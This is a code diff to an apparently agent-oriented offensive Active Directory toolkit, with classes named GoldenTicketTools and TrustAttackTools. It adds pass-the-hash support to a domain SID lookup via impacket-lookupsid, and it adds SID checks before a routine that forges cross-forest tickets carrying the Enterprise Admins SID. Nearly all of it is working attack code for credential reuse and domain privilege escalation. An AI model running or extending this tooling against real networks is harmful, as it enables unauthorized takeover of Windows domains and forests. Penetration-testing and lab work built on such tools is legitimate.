@@ -65,11 +65,32 @@ class GoldenTicketTools(Toolset):
             >>> get_sid("child.contoso.local", "user", "pass", "192.168.58.100")
             >>> get_sid("contoso.local", "user", "pass", "192.168.58.101")
         """
-        if dc_ip:
-            cmd = ["impacket-lookupsid", f"{domain}/{username}:{password}@{dc_ip}"]
+        # Detect if password is actually an NTLM hash
+        import re
+
+        is_hash = bool(
+            re.match(r"^[a-fA-F0-9]{32}$", password)
+            or re.match(r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$", password)
+        )
+
+        if is_hash:
+            # Extract NT hash (last 32 chars if LM:NT format)
+            nt_hash = password.rsplit(":", maxsplit=1)[-1] if ":" in password else password
+            hash_arg = f":{nt_hash}"
+            target = dc_ip or domain
+            cmd = [
+                "impacket-lookupsid",
+                f"{domain}/{username}@{target}",
+                "-hashes",
+                hash_arg,
+                "-domain-sids",
+            ]
+            logger.info(f"[*] Getting SID for {domain} using {username} (pass-the-hash)")
+        elif dc_ip:
+            cmd = ["impacket-lookupsid", f"{domain}/{username}:{password}@{dc_ip}", "-domain-sids"]
             logger.info(f"[*] Getting SID for {domain} using {username} via DC {dc_ip}")
         else:
-            cmd = ["impacket-lookupsid", f"{username}:{password}@{domain}"]
+            cmd = ["impacket-lookupsid", f"{username}:{password}@{domain}", "-domain-sids"]
             logger.info(f"[*] Getting SID for {domain} using {username}")
 
         try:
@@ -2083,6 +2104,18 @@ class TrustAttackTools(Toolset):
             ...     "S-1-5-21-456...",
             ... )
         """
+        # Validate SIDs before calling ticketer (avoids cryptic 'list index out of range')
+        if not source_sid or not source_sid.startswith("S-1-5-21-"):
+            return (
+                f"Error: Invalid source_sid '{source_sid}'. "
+                f"Use get_sid on {source_domain} to obtain the domain SID first."
+            )
+        if not target_sid or not target_sid.startswith("S-1-5-21-"):
+            return (
+                f"Error: Invalid target_sid '{target_sid}'. "
+                f"Use get_sid on {target_domain} to obtain the domain SID first."
+            )
+
         # Create Enterprise Admins SID for target forest (-519)
         enterprise_admin_sid = f"{target_sid}-519"
 
